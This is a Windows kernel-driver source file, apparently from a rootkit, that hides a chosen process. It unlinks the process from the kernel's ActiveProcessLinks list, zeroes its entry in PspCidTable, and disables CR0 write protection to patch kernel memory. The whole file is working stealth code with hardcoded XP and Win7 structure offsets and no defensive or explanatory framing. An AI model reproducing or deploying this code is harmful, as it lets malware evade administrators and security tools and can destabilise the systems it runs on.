#include "HideProcess.h"
#include "Common.h"
extern WIN_VERSION WinVersion;
extern ULONG_PTR Active_List;
extern ULONG_PTR ProcessIdOfEprocess;
extern ULONG_PTR ProcessImageNameOfEprocess;

extern ULONG_PTR PspCidTable;

KIRQL Irql;
VOID RemoveNodeFromActiveProcessLinks(ULONG_PTR ProcessId)
{
	NTSTATUS status;
	PEPROCESS	Process;
	ULONG_PTR ActiveOffsetPre = 0;
	ULONG_PTR ActiveOffsetNext = 0;
	PLIST_ENTRY Temp = NULL;

	switch(WinVersion)
	{
#ifdef _WIN32
    case WINDOWS_XP:   //32Bits
        {
            ActiveOffsetPre =  0x8c;
            ActiveOffsetNext = 0x88;
            break;
        }
#else
    case WINDOWS_7:   //64Bits 
        {
            ActiveOffsetPre =  0x190;
            ActiveOffsetNext = 0x188;
            break;
        }
#endif
    default:
        return;
	}

	status = PsLookupProcessByProcessId((HANDLE)ProcessId,&Process);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("PsLookupProcessByProcessId Error!\n");
		return ;
	}
		
	Temp = (PLIST_ENTRY)((ULONG_PTR)Process + ActiveOffsetNext);
	DbgPrint("ID:%d  %s\r\n",*((ULONG_PTR*)((ULONG_PTR)Process + ProcessIdOfEprocess)),(char*)((ULONG_PTR)Process + ProcessImageNameOfEprocess));
	if (MmIsAddressValid(Temp))
	{
		RemoveEntryList(Temp);
	}

    if(Process)
        ObDereferenceObject(Process);

    return;
}


VOID EraseObjectFromHandleTable1(ULONG_PTR ProcessId)
{
	PHANDLE_TABLE   HandleTable = NULL;    // 指向句柄表的指针   
	ULONG_PTR uTableCode = 0;  
	ULONG uFlag = 0;

	if(PspCidTable == NULL)
        return;

	HandleTable = (PHANDLE_TABLE)(*(ULONG_PTR*)PspCidTable);  

	if (HandleTable && MmIsAddressValid((PVOID)HandleTable))
	{
		uTableCode = (ULONG_PTR)(HandleTable->TableCode) & 0xFFFFFFFFFFFFFFFC;
		if (uTableCode && MmIsAddressValid((PVOID)uTableCode))
		{
			uFlag = (ULONG)(HandleTable->TableCode) & 0x03;    //00  01  10  
			DbgPrint("Flag %d",uFlag);
			switch (uFlag)
			{
			case 0:
				{
					EnumTable11(uTableCode,ProcessId);
					break;
				}
			case 1:
				{
					EnumTable12(uTableCode,ProcessId);
					break;
				}
			case 2:
				{
					EnumTable13(uTableCode,ProcessId);
					break; 
				}
			default:
				KdPrint(("TableCode error\n"));
			} 			
		}
	}
}


//uTableCode  已经清了最后两位
NTSTATUS EnumTable11(ULONG_PTR uTableCode,ULONG_PTR ProcessId)
{
	PVOID  Object = NULL;
	PHANDLE_TABLE_ENTRY HandleTableEntry = NULL;  
	ULONG uIndex = 0;
	ULONG_PTR ulOffset = 0;
	switch(WinVersion)
	{
#ifdef _WIN32
    case WINDOWS_XP:
        {
            ulOffset = 0x8;
            break;
        }
#else
    case WINDOWS_7:
        {
            ulOffset = 0x10;
            break;
        }
#endif
    default:
        return STATUS_INVALID_PARAMETER;
	}

	HandleTableEntry = (PHANDLE_TABLE_ENTRY)((ULONG_PTR)(*(ULONG_PTR*)uTableCode) + ulOffset); 
    //xp offset 0x08  
	//Win7 offset 0x10
	for (uIndex = 0;uIndex<511; uIndex++ )  
	{  
		if (MmIsAddressValid((PVOID)&(HandleTableEntry->NextFreeTableEntry)))
		{
			if (HandleTableEntry->NextFreeTableEntry==0)
			{
				if (HandleTableEntry->Object != NULL )  
				{  
					if (MmIsAddressValid(HandleTableEntry->Object))
					{
						Object = (PVOID)(((ULONG_PTR)HandleTableEntry->Object)  & 0xFFFFFFFFFFFFFFF8);  //去掉低三位
						if(ClearPspCidTable((PEPROCESS)Object,ProcessId)==TRUE)
						{
							WPOFF();
							memset(HandleTableEntry,0,sizeof(HANDLE_TABLE_ENTRY));
							WPON();
						}
					}
				}
			}
		}
		HandleTableEntry++;  
	}  

	return STATUS_SUCCESS;
}



NTSTATUS EnumTable12(ULONG_PTR uTableCode,ULONG_PTR ProcessId)
{
	do   
	{  
		EnumTable11(uTableCode,ProcessId);  
		uTableCode += sizeof(ULONG_PTR);  
	} while (*(PULONG_PTR)uTableCode != 0 && MmIsAddressValid((PVOID)*(PULONG_PTR)uTableCode));  

	return STATUS_SUCCESS;
}

NTSTATUS EnumTable13(ULONG_PTR uTableCode,ULONG_PTR ProcessId)
{
	do   
	{  
		EnumTable12(uTableCode,ProcessId);  
		uTableCode += sizeof(ULONG_PTR);  
	} while (*(PULONG_PTR)uTableCode != 0);  

	return STATUS_SUCCESS;  
}

BOOLEAN ClearPspCidTable(PEPROCESS Process, ULONG_PTR PrcessId)
{
	KAPC_STATE ApcState;
	PPEB  Peb = NULL;
	ULONG_PTR  ulProcessParamters = 0;

	if (Process && MmIsAddressValid((PVOID)Process) && KeGetObjectType((PVOID)Process) == (ULONG_PTR)*PsProcessType)
	{ 
		if (!IsProcessDie(Process)&&
			NT_SUCCESS(ObReferenceObjectByPointer(Process, 0, NULL, KernelMode)))  //因为要操作该对象所以增加引用计数
		{
			DbgPrint("PspCidTable ID:%d  %s\r\n",*((ULONG_PTR*)((ULONG_PTR)Process + ProcessIdOfEprocess)),(char*)((ULONG_PTR)Process + ProcessImageNameOfEprocess));
		
			if(PrcessId == *(ULONG_PTR*)((ULONG_PTR)Process + ProcessIdOfEprocess))
			{
				return TRUE;
			}
			ObfDereferenceObject(Process);
		}
	} 

	return FALSE;
}

VOID WPOFF()
{
	ULONG_PTR cr0 = 0;
	Irql = KeRaiseIrqlToDpcLevel();
	cr0 =__readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();                      
}
VOID WPON()
{
	ULONG_PTR cr0=__readcr0();
	cr0 |= 0x10000;
	_enable();                    
	__writecr0(cr0);
	KeLowerIrql(Irql);
}

